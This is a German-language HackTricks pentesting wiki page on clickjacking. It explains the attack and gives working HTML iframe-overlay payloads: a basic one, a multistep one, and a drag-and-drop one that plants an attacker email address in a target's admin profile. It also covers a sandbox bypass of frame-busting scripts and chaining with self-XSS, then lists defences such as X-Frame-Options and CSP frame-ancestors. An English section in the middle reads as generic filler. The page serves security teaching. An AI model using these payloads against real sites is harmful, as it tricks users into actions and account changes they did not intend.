# Clickjacking

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **GitHub-Repositories** senden.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterst√ºtzt werden.\
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Was ist Clickjacking

Bei einem Clickjacking-Angriff wird ein **Benutzer** dazu **get√§uscht**, ein **Element** auf einer Webseite anzuklicken, das entweder **unsichtbar** ist oder als ein anderes Element getarnt ist. Diese Manipulation kann zu unbeabsichtigten Konsequenzen f√ºr den Benutzer f√ºhren, wie dem Herunterladen von Malware, der Umleitung auf b√∂sartige Webseiten, der Bereitstellung von Anmeldeinformationen oder sensiblen Informationen, Geldtransfers oder dem Online-Kauf von Produkten.


### Trick zum Vorabf√ºllen von Formularen

Manchmal ist es m√∂glich, den Wert von Feldern eines Formulars mithilfe von GET-Parametern beim Laden einer Seite auszuf√ºllen. Ein Angreifer kann dieses Verhalten missbrauchen, um ein Formular mit beliebigen Daten auszuf√ºllen und die Clickjacking-Payload zu senden, damit der Benutzer die Schaltfl√§che "Senden" dr√ºckt.

### Formular mit Drag\&Drop vorabf√ºllen

Wenn Sie m√∂chten, dass der Benutzer ein Formular ausf√ºllt, aber ihn nicht direkt bitten m√∂chten, bestimmte Informationen einzugeben (wie die E-Mail-Adresse und/oder ein bestimmtes Passwort, das Sie kennen), k√∂nnen Sie ihn einfach bitten, etwas per Drag\&Drop zu verschieben, das Ihre kontrollierten Daten schreibt, wie in [**diesem Beispiel**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/) gezeigt.

### Grundlegende Payload
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Mehrstufige Payload

In some cases, a simple clickjacking attack may not be enough to achieve the desired outcome. In such situations, a multistep payload can be used to execute a series of actions on the victim's behalf.

#### How it works

The multistep payload technique involves dividing the attack into multiple steps, each triggered by a separate click event. This allows the attacker to perform a sequence of actions on the victim's behalf, potentially leading to more significant consequences.

#### Example

Let's consider an example where an attacker wants to perform a multistep payload to steal a user's sensitive information. The steps involved in this attack could be as follows:

1. The attacker creates a malicious website that contains a hidden iframe pointing to the target website.
2. When the victim visits the attacker's website, the hidden iframe loads the target website in the background.
3. The attacker overlays a transparent button on top of a legitimate button on the target website.
4. When the victim clicks on the transparent button, they unknowingly trigger an action on the target website, such as submitting a form or making a purchase.
5. The attacker captures the victim's sensitive information, such as login credentials or credit card details, by intercepting the request made by the target website.

By using a multistep payload, the attacker can execute a series of actions on the victim's behalf without their knowledge, increasing the chances of a successful attack.

#### Mitigation

To protect against multistep payload attacks, web developers should implement the following measures:

- Implement frame-busting techniques to prevent clickjacking attacks.
- Use Content Security Policy (CSP) headers to restrict the loading of external resources.
- Regularly update and patch web applications to fix any vulnerabilities that could be exploited by clickjacking attacks.
- Educate users about the risks of clicking on unfamiliar or suspicious buttons or links.

By taking these precautions, web developers can significantly reduce the risk of multistep payload attacks and protect their users' sensitive information.
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Klick-Payload

Eine weitere Methode, um Clickjacking-Angriffe durchzuf√ºhren, besteht darin, Drag\&Drop-Operationen mit einem Klick-Payload zu kombinieren. Dieser Angriff nutzt die Tatsache aus, dass moderne Webanwendungen Drag\&Drop-Funktionen unterst√ºtzen, um Dateien hochzuladen oder Elemente zu verschieben.

Der Angriff erfolgt in mehreren Schritten:

1. Der Angreifer erstellt eine unsichtbare Schicht √ºber der Webseite, die das Ziel des Angriffs ist.
2. Der Angreifer platziert ein unsichtbares Element auf der Webseite, das die Drag\&Drop-Funktion ausl√∂st.
3. Der Angreifer f√ºgt einen Event-Listener hinzu, der auf das Drag\&Drop-Ereignis reagiert und den Klick-Payload ausl√∂st.
4. Wenn der Benutzer die Webseite besucht und auf das unsichtbare Element klickt, wird das Drag\&Drop-Ereignis ausgel√∂st und der Klick-Payload wird ausgef√ºhrt.

Dieser Angriff erm√∂glicht es dem Angreifer, Aktionen im Namen des Benutzers auszuf√ºhren, indem er den Klick-Payload mit den erforderlichen Befehlen und Parametern erstellt. Der Benutzer ist sich m√∂glicherweise nicht bewusst, dass er manipuliert wird, da der Angriff hinter den Kulissen stattfindet.

Um sich vor Drag\&Drop + Klick-Payload-Angriffen zu sch√ºtzen, sollten Webentwickler sicherstellen, dass ihre Anwendungen keine unsichtbaren Elemente enthalten, die Drag\&Drop-Funktionen ausl√∂sen k√∂nnen. Dar√ºber hinaus sollten sie sicherstellen, dass alle Benutzereingaben validiert und √ºberpr√ºft werden, um unerw√ºnschte Aktionen zu verhindern.
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Wenn Sie einen **XSS-Angriff identifiziert haben, der erfordert, dass ein Benutzer auf ein Element klickt**, um den XSS auszul√∂sen, und die Seite anf√§llig f√ºr Clickjacking ist, k√∂nnen Sie es missbrauchen, um den Benutzer dazu zu bringen, auf den Button/Link zu klicken.\
Beispiel:\
_Sie haben ein **Self-XSS** in einigen privaten Details des Kontos gefunden (Details, die **nur Sie setzen und lesen k√∂nnen**). Die Seite mit dem **Formular**, um diese Details festzulegen, ist anf√§llig f√ºr **Clickjacking** und Sie k√∂nnen das **Formular** mit den GET-Parametern **vorab ausf√ºllen**._\
\_\_Ein Angreifer k√∂nnte einen **Clickjacking**-Angriff auf diese Seite vorbereiten, indem er das **Formular** mit dem **XSS-Payload** vorab ausf√ºllt und den **Benutzer dazu bringt**, das **Formular abzusenden**. Wenn das Formular dann abgesendet wird und die Werte ge√§ndert werden, wird der **Benutzer den XSS ausf√ºhren**.

## Strategien zur Abwehr von Clickjacking

### Abwehrma√ünahmen auf der Client-Seite

Auf der Client-Seite ausgef√ºhrte Skripte k√∂nnen Aktionen durchf√ºhren, um Clickjacking zu verhindern:

* Sicherstellen, dass das Anwendungsfenster das Hauptfenster oder das oberste Fenster ist.
* Alle Frames sichtbar machen.
* Klicken auf unsichtbare Frames verhindern.
* Erkennen und Benutzer auf potenzielle Clickjacking-Versuche hinweisen.

Diese Frame-Busting-Skripte k√∂nnen jedoch umgangen werden:

* **Sicherheitseinstellungen der Browser:** Einige Browser k√∂nnen diese Skripte aufgrund ihrer Sicherheitseinstellungen oder fehlender JavaScript-Unterst√ºtzung blockieren.
* **HTML5 iframe `sandbox`-Attribut:** Ein Angreifer kann Frame-Buster-Skripte neutralisieren, indem er das `sandbox`-Attribut mit den Werten `allow-forms` oder `allow-scripts` ohne `allow-top-navigation` setzt. Dadurch wird verhindert, dass das iframe √ºberpr√ºft, ob es das oberste Fenster ist, z.B.,
```html
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
Die Werte `allow-forms` und `allow-scripts` erm√∂glichen Aktionen innerhalb des Iframes und deaktivieren die Navigation auf der obersten Ebene. Um die beabsichtigte Funktionalit√§t der angegriffenen Website sicherzustellen, k√∂nnen zus√§tzliche Berechtigungen wie `allow-same-origin` und `allow-modals` je nach Angriffstyp erforderlich sein. Browser-Konsolenmeldungen k√∂nnen anzeigen, welche Berechtigungen erlaubt werden sollten.

### Serverseitige Abwehrma√ünahmen

#### X-Frame-Options

Der **HTTP-Antwortheader `X-Frame-Options`** informiert Browser √ºber die Legitimit√§t des Renderns einer Seite in einem `<frame>` oder `<iframe>` und hilft so, Clickjacking zu verhindern:

* `X-Frame-Options: deny` - Keine Domain kann den Inhalt einbetten.
* `X-Frame-Options: sameorigin` - Nur die aktuelle Website kann den Inhalt einbetten.
* `X-Frame-Options: allow-from https://trusted.com` - Nur die angegebene 'uri' kann die Seite einbetten.
* Beachten Sie die Einschr√§nkungen: Wenn der Browser diese Anweisung nicht unterst√ºtzt, funktioniert sie m√∂glicherweise nicht. Einige Browser bevorzugen die CSP-Richtlinie `frame-ancestors`.

#### Content Security Policy (CSP) frame-ancestors-Direktive

Die **`frame-ancestors`-Direktive in CSP** ist die empfohlene Methode zum Schutz vor Clickjacking:

* `frame-ancestors 'none'` - √Ñhnlich wie `X-Frame-Options: deny`.
* `frame-ancestors 'self'` - √Ñhnlich wie `X-Frame-Options: sameorigin`.
* `frame-ancestors trusted.com` - √Ñhnlich wie `X-Frame-Options: allow-from`.

Beispielsweise erlaubt die folgende CSP nur das Einbetten von Inhalten von der gleichen Domain:

`Content-Security-Policy: frame-ancestors 'self';`

Weitere Details und komplexe Beispiele finden Sie in der [frame-ancestors CSP-Dokumentation](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) und in der [Mozilla CSP frame-ancestors-Dokumentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Content Security Policy (CSP) mit `child-src` und `frame-src`

Die **Content Security Policy (CSP)** ist eine Sicherheitsma√ünahme, die dabei hilft, Clickjacking und andere Code-Injektionsangriffe zu verhindern, indem festgelegt wird, von welchen Quellen der Browser Inhalte laden darf.

#### `frame-src`-Direktive
- Definiert g√ºltige Quellen f√ºr Frames.
- Spezifischer als die `default-src`-Direktive.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Diese Richtlinie erlaubt Frames von der gleichen Herkunft (self) und https://trusted-website.com.

#### `child-src` Direktive
- Wurde in CSP Level 2 eingef√ºhrt, um g√ºltige Quellen f√ºr Web Workers und Frames festzulegen.
- Dient als Fallback f√ºr frame-src und worker-src.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Diese Richtlinie erlaubt Frames und Worker aus der gleichen Herkunft (self) und https://trusted-website.com.

**Verwendungshinweise:**
- Veraltung: child-src wird zugunsten von frame-src und worker-src abgel√∂st.
- Fallback-Verhalten: Wenn frame-src fehlt, wird child-src als Fallback f√ºr Frames verwendet. Wenn beide fehlen, wird default-src verwendet.
- Strikte Quellendefinition: Verwenden Sie nur vertrauensw√ºrdige Quellen in den Direktiven, um Ausnutzungen zu verhindern.

#### JavaScript Frame-Breaking Scripts

Obwohl nicht vollst√§ndig narrensicher, k√∂nnen JavaScript-basierte frame-breaking Skripte verwendet werden, um zu verhindern, dass eine Webseite eingerahmt wird. Beispiel:
```javascript
if (top !== self) {
top.location = self.location;
}
```
#### Verwendung von Anti-CSRF-Token

* **Token-Validierung:** Verwenden Sie Anti-CSRF-Token in Webanwendungen, um sicherzustellen, dass zustandsver√§ndernde Anfragen absichtlich vom Benutzer und nicht √ºber eine Clickjacked-Seite erfolgen.

## Referenzen

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterst√ºtzt werden.\
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
